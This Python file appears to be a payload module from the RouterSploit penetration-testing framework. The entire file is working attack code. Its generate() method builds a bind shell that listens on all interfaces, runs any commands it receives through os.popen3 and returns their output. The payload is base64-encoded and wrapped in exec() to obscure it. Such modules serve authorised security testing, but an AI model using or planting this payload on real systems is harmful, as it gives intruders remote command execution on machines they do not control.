from base64 import b64encode
from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload


class Exploit(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Python Bind TCP",
        "description": "Creates interactive tcp bind shell by using python.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    def generate(self):
        payload = (
            "import socket,os\n" +
            "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
            "so.bind(('0.0.0.0',{}))\n".format(self.rport) +
            "so.listen(1)\n" +
            "so,addr=so.accept()\n" +
            "x=False\n" +
            "while not x:\n" +
            "\tdata=so.recv(1024)\n" +
            "\tstdin,stdout,stderr,=os.popen3(data)\n" +
            "\tstdout_value=stdout.read()+stderr.read()\n" +
            "\tso.send(stdout_value)\n"
        )

        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
        return "exec('{}'.decode('base64'))".format(encoded_payload)
